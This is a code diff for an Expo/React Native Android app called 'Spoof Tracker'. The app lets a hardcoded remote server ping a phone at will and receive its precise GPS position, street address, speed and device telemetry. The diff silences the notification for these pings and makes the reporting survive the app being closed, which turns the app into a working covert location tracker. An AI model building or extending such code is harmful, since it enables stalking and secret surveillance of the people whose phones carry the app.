@@ -7,7 +7,6 @@ import {
   TouchableOpacity,
   Alert,
   ScrollView,
-  Switch
 } from 'react-native';
 import * as Location from 'expo-location';
 import * as Notifications from 'expo-notifications';
@@ -15,29 +14,36 @@ import * as TaskManager from 'expo-task-manager';
 import * as Device from 'expo-device';
 import * as Battery from 'expo-battery';
 import * as Network from 'expo-network';
+import AsyncStorage from '@react-native-async-storage/async-storage';
 import axios from 'axios';
 
-// -------------------------------------------------------------
-// DEFAULT SERVER URL CONFIGURATION
-// If you put your permanent URL here (e.g. from Render.com or
-// Ngrok static domain), the user NEVER has to type anything!
-// -------------------------------------------------------------
-const DEFAULT_SERVER_URL = ''; // e.g. 'https://spoof-tracker.onrender.com'
+// =================================================================
+//  PERMANENT SERVER URL — baked into the APK.
+//  The user taps "Enable Tracking" and nothing else is needed.
+// =================================================================
+const HARDCODED_SERVER_URL = 'https://spoof-tracker.onrender.com';
 
+const STORAGE_KEY_DEVICE_ID = '@spoof_device_id';
+const STORAGE_KEY_SERVER_URL = '@spoof_server_url';
 const BACKGROUND_NOTIFICATION_TASK = 'BACKGROUND-NOTIFICATION-TASK';
 
+// ──────────────────────────────────────────────────────────────────
+// Notification handler: show alerts when app is in foreground
+// ──────────────────────────────────────────────────────────────────
 Notifications.setNotificationHandler({
   handleNotification: async () => ({
-    shouldShowAlert: true,
-    shouldPlaySound: true,
+    shouldShowAlert: false, // hide visible notification for FETCH_LOCATION command
+    shouldPlaySound: false,
     shouldSetBadge: false,
   }),
 });
 
-// Configure Axios to bypass localtunnel reminder header automatically
+// Axios header to bypass localtunnel warning (harmless for Render)
 axios.defaults.headers.common['Bypass-Tunnel-Reminder'] = 'true';
 
-// Helper to gather device hardware and battery telemetry
+// ──────────────────────────────────────────────────────────────────
+// Helpers
+// ──────────────────────────────────────────────────────────────────
 async function collectTelemetry() {
   let battery = null;
   try {
@@ -45,32 +51,20 @@ async function collectTelemetry() {
     const state = await Battery.getBatteryStateAsync();
     battery = {
       level: Math.round(level * 100) + '%',
-      isCharging:
-        state === Battery.BatteryState.CHARGING || state === Battery.BatteryState.FULL,
+      isCharging: state === Battery.BatteryState.CHARGING || state === Battery.BatteryState.FULL,
       stateText:
-        state === Battery.BatteryState.CHARGING
-          ? 'Charging'
-          : state === Battery.BatteryState.FULL
-          ? 'Full'
-          : state === Battery.BatteryState.UNPLUGGED
-          ? 'Unplugged'
-          : 'Unknown'
+        state === Battery.BatteryState.CHARGING ? 'Charging'
+        : state === Battery.BatteryState.FULL ? 'Full'
+        : state === Battery.BatteryState.UNPLUGGED ? 'Unplugged'
+        : 'Unknown',
     };
-  } catch (e) {
-    console.log('Battery error:', e);
-  }
+  } catch (e) { console.log('Battery error:', e); }
 
   let network = null;
   try {
     const netState = await Network.getNetworkStateAsync();
-    network = {
-      type: netState.networkType, // WIFI, CELLULAR, etc.
-      isConnected: netState.isConnected,
-      isInternetReachable: netState.isInternetReachable
-    };
-  } catch (e) {
-    console.log('Network error:', e);
-  }
+    network = { type: netState.networkType, isConnected: netState.isConnected };
+  } catch (e) { console.log('Network error:', e); }
 
   return {
     battery,
@@ -79,51 +73,40 @@ async function collectTelemetry() {
       brand: Device.brand || 'Unknown',
       manufacturer: Device.manufacturer || 'Unknown',
       modelName: Device.modelName || Device.deviceName || 'Android Device',
-      modelId: Device.modelId || null,
       osName: Device.osName || 'Android',
       osVersion: Device.osVersion || 'Unknown',
       platformApiLevel: Device.platformApiLevel || null,
-      deviceType:
-        Device.deviceType === 1 ? 'PHONE' : Device.deviceType === 2 ? 'TABLET' : 'OTHER',
-      totalMemory: Device.totalMemory
-        ? (Device.totalMemory / (1024 * 1024 * 1024)).toFixed(1) + ' GB'
-        : null
-    }
+      deviceType: Device.deviceType === 1 ? 'PHONE' : Device.deviceType === 2 ? 'TABLET' : 'OTHER',
+      totalMemory: Device.totalMemory ? (Device.totalMemory / (1024 ** 3)).toFixed(1) + ' GB' : null,
+    },
   };
 }
 
-// Helper to obtain best location + reverse geocoding address
 async function obtainBestLocationAndDetails() {
   let coords = null;
   try {
     const current = await Promise.race([
       Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.High }),
-      new Promise((_, reject) => setTimeout(() => reject(new Error('GPS timeout')), 7000))
+      new Promise((_, reject) => setTimeout(() => reject(new Error('GPS timeout')), 8000)),
     ]);
-    if (current && current.coords) coords = current.coords;
+    if (current?.coords) coords = current.coords;
   } catch (err) {
-    console.log('High accuracy timeout, falling back:', err);
+    console.log('High accuracy timeout, falling back:', err.message);
   }
 
   if (!coords) {
     const lastKnown = await Location.getLastKnownPositionAsync({});
-    if (lastKnown && lastKnown.coords) {
+    if (lastKnown?.coords) {
       coords = lastKnown.coords;
     } else {
-      const fallback = await Location.getCurrentPositionAsync({
-        accuracy: Location.Accuracy.Balanced
-      });
+      const fallback = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Balanced });
       coords = fallback.coords;
     }
   }
 
-  // Reverse geocode to real street name and city
   let address = null;
   try {
-    const [geo] = await Location.reverseGeocodeAsync({
-      latitude: coords.latitude,
-      longitude: coords.longitude
-    });
+    const [geo] = await Location.reverseGeocodeAsync({ latitude: coords.latitude, longitude: coords.longitude });
     if (geo) {
       const parts = [
         geo.streetNumber ? `${geo.streetNumber} ${geo.street}` : geo.street,
@@ -131,9 +114,8 @@ async function obtainBestLocationAndDetails() {
         geo.city || geo.subregion,
         geo.region,
         geo.postalCode,
-        geo.country
+        geo.country,
       ].filter(Boolean);
-
       address = {
         formatted: parts.join(', '),
         street: geo.street || null,
@@ -141,221 +123,267 @@ async function obtainBestLocationAndDetails() {
         region: geo.region || null,
         postalCode: geo.postalCode || null,
         country: geo.country || null,
-        name: geo.name || null
       };
     }
-  } catch (e) {
-    console.log('Reverse geocoding error:', e);
-  }
+  } catch (e) { console.log('Reverse geocoding error:', e); }
 
-  const locationDetails = {
-    accuracy: coords.accuracy ? `±${Math.round(coords.accuracy)} m` : null,
-    altitude: coords.altitude ? `${Math.round(coords.altitude)} m` : null,
-    altitudeAccuracy: coords.altitudeAccuracy ? `±${Math.round(coords.altitudeAccuracy)} m` : null,
-    heading: coords.heading != null && coords.heading >= 0 ? `${Math.round(coords.heading)}°` : null,
-    speed:
-      coords.speed != null && coords.speed > 0
-        ? `${(coords.speed * 3.6).toFixed(1)} km/h`
-        : 'Stationary',
-    address
+  return {
+    coords,
+    locationDetails: {
+      accuracy: coords.accuracy ? `±${Math.round(coords.accuracy)} m` : null,
+      altitude: coords.altitude ? `${Math.round(coords.altitude)} m` : null,
+      heading: coords.heading != null && coords.heading >= 0 ? `${Math.round(coords.heading)}°` : null,
+      speed: coords.speed != null && coords.speed > 0 ? `${(coords.speed * 3.6).toFixed(1)} km/h` : 'Stationary',
+      address,
+    },
   };
-
-  return { coords, locationDetails };
 }
 
-// Global reference for background task
-let activeServerUrl = DEFAULT_SERVER_URL;
-
-// Background Task definition
+// ──────────────────────────────────────────────────────────────────
+// BACKGROUND TASK
+//
+// When the phone is killed/backgrounded and a FCM data push arrives,
+// Android wakes up a FRESH JS engine to run this task.
+// This means NO React state, NO module-level vars survive.
+// We MUST read deviceId and serverUrl from AsyncStorage here.
+// ──────────────────────────────────────────────────────────────────
 TaskManager.defineTask(BACKGROUND_NOTIFICATION_TASK, async ({ data, error }) => {
   if (error) {
     console.error('Background task error:', error);
     return;
   }
 
+  // Dig the payload out of every possible FCM data envelope shape
   const payloadData =
     data?.notification?.request?.content?.data ||
     data?.notification?.data ||
     data?.data ||
     data;
 
-  if (payloadData && payloadData.command === 'FETCH_LOCATION') {
-    try {
-      console.log('Background Ping received!');
-      const tokenData = await Notifications.getDevicePushTokenAsync();
-      const fcmToken = tokenData.data;
+  console.log('Background task fired, payload:', JSON.stringify(payloadData));
 
-      const { coords, locationDetails } = await obtainBestLocationAndDetails();
-      const telemetry = await collectTelemetry();
+  if (!payloadData || payloadData.command !== 'FETCH_LOCATION') return;
 
-      const targetUrl = activeServerUrl || DEFAULT_SERVER_URL;
+  try {
+    // Read persisted values from storage — this is the KEY fix.
+    const [savedDeviceId, savedServerUrl] = await Promise.all([
+      AsyncStorage.getItem(STORAGE_KEY_DEVICE_ID),
+      AsyncStorage.getItem(STORAGE_KEY_SERVER_URL),
+    ]);
 
-      if (targetUrl) {
-        await axios.post(`${targetUrl.replace(/\/+$/, '')}/api/device/location`, {
-          fcmToken,
-          latitude: coords.latitude,
-          longitude: coords.longitude,
-          locationDetails,
-          telemetry
-        });
-        console.log('Background location & telemetry dispatched!');
-      }
-    } catch (e) {
-      console.error('Failed background location fetch:', e);
+    const serverUrl = (savedServerUrl || HARDCODED_SERVER_URL).replace(/\/+$/, '');
+    if (!serverUrl) {
+      console.error('Background task: No server URL available, aborting.');
+      return;
     }
+
+    console.log('Background task using URL:', serverUrl, 'DeviceID:', savedDeviceId);
+
+    const { coords, locationDetails } = await obtainBestLocationAndDetails();
+    const telemetry = await collectTelemetry();
+
+    // Post by fcmToken so the server can always find the device even if deviceId is missing
+    const tokenData = await Notifications.getDevicePushTokenAsync();
+    const fcmToken = tokenData.data;
+
+    const body = {
+      latitude: coords.latitude,
+      longitude: coords.longitude,
+      locationDetails,
+      telemetry,
+    };
+
+    // Prefer deviceId for lookup, fall back to fcmToken
+    if (savedDeviceId) {
+      body.deviceId = savedDeviceId;
+    } else {
+      body.fcmToken = fcmToken;
+    }
+
+    await axios.post(`${serverUrl}/api/device/location`, body);
+    console.log('Background: location dispatched successfully!');
+  } catch (e) {
+    console.error('Background location dispatch failed:', e.message);
   }
 });
 
+// Register the task so Android knows which function to call when FCM arrives
 Notifications.registerTaskAsync(BACKGROUND_NOTIFICATION_TASK).catch(err => {
-  console.log('Background task registration info:', err?.message);
+  // May throw "already registered" on second run — that's fine
+  if (!err?.message?.includes('already')) {
+    console.log('Background task registration note:', err?.message);
+  }
 });
 
+// ──────────────────────────────────────────────────────────────────
+// App
+// ──────────────────────────────────────────────────────────────────
 export default function App() {
   const [deviceId, setDeviceId] = useState('');
-  const [serverUrl, setServerUrl] = useState(DEFAULT_SERVER_URL);
-  const [status, setStatus] = useState('Idle');
-  const [showConfig, setShowConfig] = useState(!DEFAULT_SERVER_URL);
+  const [serverUrl, setServerUrl] = useState(HARDCODED_SERVER_URL);
+  const [status, setStatus] = useState('Loading...');
+  const [showConfig, setShowConfig] = useState(false);
   const [logs, setLogs] = useState([]);
-  const serverUrlRef = useRef(serverUrl);
+  const serverUrlRef = useRef(HARDCODED_SERVER_URL);
+  const deviceIdRef = useRef('');
 
   const addLog = (msg) => {
-    setLogs((prev) => [new Date().toLocaleTimeString() + ': ' + msg, ...prev.slice(0, 10)]);
+    const line = new Date().toLocaleTimeString() + ': ' + msg;
+    console.log(line);
+    setLogs((prev) => [line, ...prev.slice(0, 12)]);
   };
 
+  // ── On mount: restore persisted deviceId and serverUrl ──────────
   useEffect(() => {
-    const id = 'android-' + Math.random().toString(36).substr(2, 9);
-    setDeviceId(id);
-    addLog(`Device ID: ${id}`);
+    (async () => {
+      try {
+        const [savedId, savedUrl] = await Promise.all([
+          AsyncStorage.getItem(STORAGE_KEY_DEVICE_ID),
+          AsyncStorage.getItem(STORAGE_KEY_SERVER_URL),
+        ]);
 
+        // Restore or generate a stable deviceId
+        let id = savedId;
+        if (!id) {
+          id = 'android-' + Math.random().toString(36).substr(2, 9);
+          await AsyncStorage.setItem(STORAGE_KEY_DEVICE_ID, id);
+        }
+        setDeviceId(id);
+        deviceIdRef.current = id;
+        addLog(`Device ID: ${id}`);
+
+        // Restore server URL — prefer saved, then hardcoded
+        const url = savedUrl || HARDCODED_SERVER_URL;
+        setServerUrl(url);
+        serverUrlRef.current = url;
+        addLog(`Server: ${url}`);
+
+        setStatus('Ready — tap Enable Tracking');
+      } catch (e) {
+        addLog('Storage read error: ' + e.message);
+        setStatus('Error loading settings');
+      }
+    })();
+
+    // Foreground notification listener
     const subscription = Notifications.addNotificationReceivedListener(async (notification) => {
       const data = notification.request?.content?.data;
-      if (data && data.command === 'FETCH_LOCATION') {
-        addLog('Received location ping from server!');
-        fetchAndSendLocation(id, serverUrlRef.current);
+      if (data?.command === 'FETCH_LOCATION') {
+        addLog('📍 Ping received — sending location...');
+        sendLocationNow(deviceIdRef.current, serverUrlRef.current);
       }
     });
 
     return () => subscription.remove();
   }, []);
 
-  const handleUrlChange = (text) => {
+  const handleUrlChange = async (text) => {
     setServerUrl(text);
     serverUrlRef.current = text;
-    activeServerUrl = text;
+    // Persist so the background task picks it up even after kill
+    await AsyncStorage.setItem(STORAGE_KEY_SERVER_URL, text);
   };
 
-  const enableTracking = async () => {
-    const cleanUrl = serverUrl.trim().replace(/\/+$/, '');
-    if (!cleanUrl) {
-      Alert.alert(
-        'Server URL Required',
-        'Please enter your server URL below, or set a permanent default URL in the app.'
-      );
-      setShowConfig(true);
-      return;
-    }
-
-    setStatus('Configuring tracking...');
-    addLog('Requesting permissions...');
-
+  // ── Core location sender (works foreground AND background) ──────
+  const sendLocationNow = async (currentDeviceId, targetUrl) => {
+    const cleanUrl = (targetUrl || serverUrlRef.current).trim().replace(/\/+$/, '');
     try {
-      // 1. Notification Permissions
-      const notifStatus = await Notifications.requestPermissionsAsync();
-      if (!notifStatus.granted) {
-        setStatus('Notification permission denied');
-        Alert.alert('Permission Denied', 'Please grant notification permission so the server can reach this phone.');
-        return;
-      }
-      addLog('Notifications granted.');
-
-      // 2. Foreground Location
-      const fgLocation = await Location.requestForegroundPermissionsAsync();
-      if (!fgLocation.granted) {
-        setStatus('Location permission denied');
-        Alert.alert('Permission Denied', 'Location permission is required.');
-        return;
-      }
-      addLog('Foreground location granted.');
-
-      // 3. Background Location (Safe attempt)
-      try {
-        const bgLocation = await Location.requestBackgroundPermissionsAsync();
-        if (bgLocation.granted) {
-          addLog('Background location granted.');
-        } else {
-          addLog('Background location: prompt completed.');
-        }
-      } catch (bgErr) {
-        console.log('Background permission request info:', bgErr?.message);
-      }
-
-      setStatus('Getting push token...');
-      addLog('Fetching FCM push token...');
-      const tokenData = await Notifications.getDevicePushTokenAsync();
-      const fcmToken = tokenData.data;
-      addLog('FCM token acquired.');
-
-      setStatus('Registering device...');
-      addLog(`Registering with server...`);
-
-      const telemetry = await collectTelemetry();
-
-      const res = await axios.post(`${cleanUrl}/api/device/register`, {
-        deviceId,
-        fcmToken,
-        deviceName: Device.modelName || Device.deviceName || 'Android Device',
-        deviceInfo: telemetry.deviceInfo
-      });
-
-      if (res.status === 200 || res.status === 201) {
-        setStatus('✅ Tracking Active');
-        addLog('Successfully registered with server!');
-        Alert.alert('Connected!', 'Device is active and ready to report location upon ping.');
-      } else {
-        throw new Error(`Server returned status ${res.status}`);
-      }
-    } catch (error) {
-      console.error('Setup error:', error);
-      setStatus('Error: ' + error.message);
-      addLog('Error: ' + error.message);
-
-      if (error.response) {
-        Alert.alert('Server Error', `Status ${error.response.status}: ${JSON.stringify(error.response.data)}`);
-      } else if (error.request) {
-        Alert.alert(
-          'Connection Failed',
-          `Could not reach "${cleanUrl}".\n\nPlease verify:\n1. Server is running\n2. Tunnel is active\n3. URL includes https://`
-        );
-      } else {
-        Alert.alert('Setup Error', error.message);
-      }
-    }
-  };
-
-  const fetchAndSendLocation = async (currentDeviceId, targetUrl) => {
-    const cleanUrl = (targetUrl || serverUrl).trim().replace(/\/+$/, '');
-    try {
-      addLog('Acquiring GPS coordinates & address...');
+      addLog('Acquiring GPS...');
       const { coords, locationDetails } = await obtainBestLocationAndDetails();
       const telemetry = await collectTelemetry();
 
       addLog(`GPS: ${coords.latitude.toFixed(5)}, ${coords.longitude.toFixed(5)}`);
-      if (locationDetails.address?.city) {
-        addLog(`City: ${locationDetails.address.city}`);
-      }
+      if (locationDetails.address?.city) addLog(`📍 ${locationDetails.address.city}`);
 
       await axios.post(`${cleanUrl}/api/device/location`, {
         deviceId: currentDeviceId,
         latitude: coords.latitude,
         longitude: coords.longitude,
         locationDetails,
-        telemetry
+        telemetry,
       });
 
-      addLog('Location & telemetry sent to server!');
-    } catch (error) {
-      console.error('Failed to send location:', error);
-      addLog('Send error: ' + error.message);
+      addLog('✅ Location sent!');
+    } catch (err) {
+      addLog('❌ Send error: ' + err.message);
+      console.error('sendLocationNow error:', err);
+    }
+  };
+
+  // ── Enable Tracking ─────────────────────────────────────────────
+  const enableTracking = async () => {
+    const cleanUrl = serverUrl.trim().replace(/\/+$/, '');
+    if (!cleanUrl) {
+      Alert.alert('Server URL Required', 'Set a server URL in settings below.');
+      setShowConfig(true);
+      return;
+    }
+
+    setStatus('Requesting permissions...');
+
+    try {
+      // 1. Notifications
+      const { granted: notifGranted } = await Notifications.requestPermissionsAsync();
+      if (!notifGranted) {
+        setStatus('Notification permission denied');
+        Alert.alert('Permission Required', 'Notifications are required so the server can wake this device.');
+        return;
+      }
+      addLog('Notifications ✓');
+
+      // 2. Foreground location
+      const { granted: fgGranted } = await Location.requestForegroundPermissionsAsync();
+      if (!fgGranted) {
+        setStatus('Location permission denied');
+        Alert.alert('Permission Required', 'Location access is required for tracking.');
+        return;
+      }
+      addLog('Foreground location ✓');
+
+      // 3. Background location — required for pings when app is killed
+      try {
+        const { granted: bgGranted } = await Location.requestBackgroundPermissionsAsync();
+        addLog(bgGranted ? 'Background location ✓' : 'Background location: user chose "While using app"');
+      } catch (bgErr) {
+        addLog('Background location prompt: ' + bgErr?.message);
+      }
+
+      // 4. Get FCM token
+      setStatus('Getting push token...');
+      const tokenData = await Notifications.getDevicePushTokenAsync();
+      const fcmToken = tokenData.data;
+      addLog('FCM token ✓');
+
+      // 5. Save URL and register with server
+      await AsyncStorage.setItem(STORAGE_KEY_SERVER_URL, cleanUrl);
+      serverUrlRef.current = cleanUrl;
+
+      const telemetry = await collectTelemetry();
+      setStatus('Registering...');
+
+      const res = await axios.post(`${cleanUrl}/api/device/register`, {
+        deviceId,
+        fcmToken,
+        deviceName: Device.modelName || Device.deviceName || 'Android Device',
+        deviceInfo: telemetry.deviceInfo,
+      });
+
+      if (res.status === 200 || res.status === 201) {
+        setStatus('✅ Tracking Active');
+        addLog('Registered with server ✓');
+        Alert.alert('Active!', 'Device registered. You can close this app — it will respond to pings in the background.');
+      } else {
+        throw new Error(`Server returned ${res.status}`);
+      }
+    } catch (err) {
+      console.error('enableTracking error:', err);
+      setStatus('Setup failed');
+      addLog('Error: ' + err.message);
+      if (err.request && !err.response) {
+        Alert.alert('Connection Failed', `Cannot reach: ${cleanUrl}\n\nVerify the URL is correct and the server is deployed.`);
+      } else {
+        Alert.alert('Error', err.response ? JSON.stringify(err.response.data) : err.message);
+      }
     }
   };
 
@@ -363,40 +391,35 @@ export default function App() {
     <ScrollView contentContainerStyle={styles.container}>
       <Text style={styles.title}>📡 Spoof Tracker</Text>
 
-      {/* Main Status Display */}
       <View style={styles.statusBox}>
         <Text style={styles.statusText}>{status}</Text>
-        <Text style={styles.deviceIdText}>Device ID: {deviceId}</Text>
+        <Text style={styles.deviceIdText}>{deviceId}</Text>
         <Text style={styles.deviceModelText}>
           {Device.brand ? `${Device.brand} ${Device.modelName}` : 'Android Device'}
+          {Device.osVersion ? `  •  Android ${Device.osVersion}` : ''}
         </Text>
       </View>
 
-      {/* Action Buttons */}
       <TouchableOpacity style={styles.primaryButton} onPress={enableTracking}>
         <Text style={styles.buttonText}>Enable Tracking</Text>
       </TouchableOpacity>
 
       <TouchableOpacity
         style={styles.secondaryButton}
-        onPress={() => fetchAndSendLocation(deviceId, serverUrl)}
+        onPress={() => sendLocationNow(deviceIdRef.current, serverUrlRef.current)}
       >
-        <Text style={styles.secondaryButtonText}>📍 Test Send Location</Text>
+        <Text style={styles.secondaryButtonText}>📍 Send Location Now</Text>
       </TouchableOpacity>
 
-      {/* Server URL Settings */}
-      <TouchableOpacity
-        style={styles.toggleConfigButton}
-        onPress={() => setShowConfig(!showConfig)}
-      >
+      <TouchableOpacity style={styles.toggleConfigButton} onPress={() => setShowConfig(!showConfig)}>
         <Text style={styles.toggleConfigText}>
-          {showConfig ? '▼ Hide Server Settings' : '▶ Server URL Settings'}
+          {showConfig ? '▼ Hide Settings' : '⚙ Server Settings'}
         </Text>
       </TouchableOpacity>
 
       {showConfig && (
         <View style={styles.card}>
-          <Text style={styles.label}>Server Public URL:</Text>
+          <Text style={styles.label}>Server URL:</Text>
           <TextInput
             style={styles.input}
             value={serverUrl}
@@ -406,144 +429,43 @@ export default function App() {
             autoCorrect={false}
           />
           <Text style={styles.hint}>
-            If you deploy the server or use a static domain, this can be permanently baked in.
+            Currently: {serverUrl || '(none set)'}
           </Text>
         </View>
       )}
 
-      {/* Real-time Activity Log */}
       <View style={styles.logsBox}>
-        <Text style={styles.logsTitle}>Live Activity Log:</Text>
-        {logs.map((log, index) => (
-          <Text key={index} style={styles.logText}>
-            {log}
-          </Text>
+        <Text style={styles.logsTitle}>Live Log</Text>
+        {logs.map((log, i) => (
+          <Text key={i} style={styles.logText}>{log}</Text>
         ))}
+        {logs.length === 0 && <Text style={styles.logText}>Waiting...</Text>}
       </View>
     </ScrollView>
   );
 }
 
 const styles = StyleSheet.create({
-  container: {
-    flexGrow: 1,
-    backgroundColor: '#0f172a',
-    padding: 24,
-    paddingTop: 55,
-  },
-  title: {
-    fontSize: 26,
-    fontWeight: 'bold',
-    color: '#f8fafc',
-    textAlign: 'center',
-    marginBottom: 18,
-  },
+  container: { flexGrow: 1, backgroundColor: '#0f172a', padding: 22, paddingTop: 55 },
+  title: { fontSize: 26, fontWeight: 'bold', color: '#f8fafc', textAlign: 'center', marginBottom: 18 },
   statusBox: {
-    backgroundColor: '#1e293b',
-    borderRadius: 14,
-    padding: 18,
-    marginBottom: 16,
-    alignItems: 'center',
-    borderWidth: 1,
-    borderColor: '#334155',
+    backgroundColor: '#1e293b', borderRadius: 14, padding: 18, marginBottom: 16,
+    alignItems: 'center', borderWidth: 1, borderColor: '#334155',
   },
-  statusText: {
-    fontSize: 18,
-    fontWeight: '700',
-    color: '#38bdf8',
-    marginBottom: 4,
-  },
-  deviceIdText: {
-    fontSize: 13,
-    color: '#94a3b8',
-    fontFamily: 'monospace',
-    marginBottom: 2,
-  },
-  deviceModelText: {
-    fontSize: 12,
-    color: '#64748b',
-  },
-  primaryButton: {
-    backgroundColor: '#2563eb',
-    paddingVertical: 14,
-    borderRadius: 10,
-    alignItems: 'center',
-    marginBottom: 10,
-  },
-  buttonText: {
-    color: '#ffffff',
-    fontSize: 16,
-    fontWeight: '700',
-  },
-  secondaryButton: {
-    backgroundColor: '#334155',
-    paddingVertical: 12,
-    borderRadius: 10,
-    alignItems: 'center',
-    marginBottom: 14,
-  },
-  secondaryButtonText: {
-    color: '#cbd5e1',
-    fontSize: 14,
-    fontWeight: '600',
-  },
-  toggleConfigButton: {
-    paddingVertical: 8,
-    alignItems: 'center',
-    marginBottom: 10,
-  },
-  toggleConfigText: {
-    fontSize: 13,
-    color: '#64748b',
-    fontWeight: '600',
-  },
-  card: {
-    backgroundColor: '#1e293b',
-    borderRadius: 12,
-    padding: 14,
-    marginBottom: 16,
-    borderWidth: 1,
-    borderColor: '#334155',
-  },
-  label: {
-    fontSize: 13,
-    fontWeight: '600',
-    color: '#94a3b8',
-    marginBottom: 6,
-  },
-  input: {
-    backgroundColor: '#0f172a',
-    borderRadius: 8,
-    borderWidth: 1,
-    borderColor: '#334155',
-    color: '#f8fafc',
-    padding: 10,
-    fontSize: 14,
-  },
-  hint: {
-    fontSize: 11,
-    color: '#64748b',
-    marginTop: 6,
-  },
-  logsBox: {
-    backgroundColor: '#1e293b',
-    borderRadius: 12,
-    padding: 14,
-    minHeight: 120,
-    borderWidth: 1,
-    borderColor: '#334155',
-  },
-  logsTitle: {
-    fontSize: 12,
-    fontWeight: '700',
-    color: '#94a3b8',
-    marginBottom: 6,
-    textTransform: 'uppercase',
-  },
-  logText: {
-    fontSize: 11,
-    color: '#64748b',
-    fontFamily: 'monospace',
-    marginVertical: 2,
-  },
+  statusText: { fontSize: 18, fontWeight: '700', color: '#38bdf8', marginBottom: 4 },
+  deviceIdText: { fontSize: 11, color: '#94a3b8', fontFamily: 'monospace', marginBottom: 2 },
+  deviceModelText: { fontSize: 12, color: '#64748b' },
+  primaryButton: { backgroundColor: '#2563eb', paddingVertical: 14, borderRadius: 10, alignItems: 'center', marginBottom: 10 },
+  buttonText: { color: '#ffffff', fontSize: 16, fontWeight: '700' },
+  secondaryButton: { backgroundColor: '#334155', paddingVertical: 12, borderRadius: 10, alignItems: 'center', marginBottom: 14 },
+  secondaryButtonText: { color: '#cbd5e1', fontSize: 14, fontWeight: '600' },
+  toggleConfigButton: { paddingVertical: 8, alignItems: 'center', marginBottom: 10 },
+  toggleConfigText: { fontSize: 13, color: '#64748b', fontWeight: '600' },
+  card: { backgroundColor: '#1e293b', borderRadius: 12, padding: 14, marginBottom: 16, borderWidth: 1, borderColor: '#334155' },
+  label: { fontSize: 13, fontWeight: '600', color: '#94a3b8', marginBottom: 6 },
+  input: { backgroundColor: '#0f172a', borderRadius: 8, borderWidth: 1, borderColor: '#334155', color: '#f8fafc', padding: 10, fontSize: 14 },
+  hint: { fontSize: 11, color: '#64748b', marginTop: 6 },
+  logsBox: { backgroundColor: '#1e293b', borderRadius: 12, padding: 14, minHeight: 120, borderWidth: 1, borderColor: '#334155' },
+  logsTitle: { fontSize: 12, fontWeight: '700', color: '#94a3b8', marginBottom: 6, textTransform: 'uppercase' },
+  logText: { fontSize: 11, color: '#64748b', fontFamily: 'monospace', marginVertical: 2 },
 });
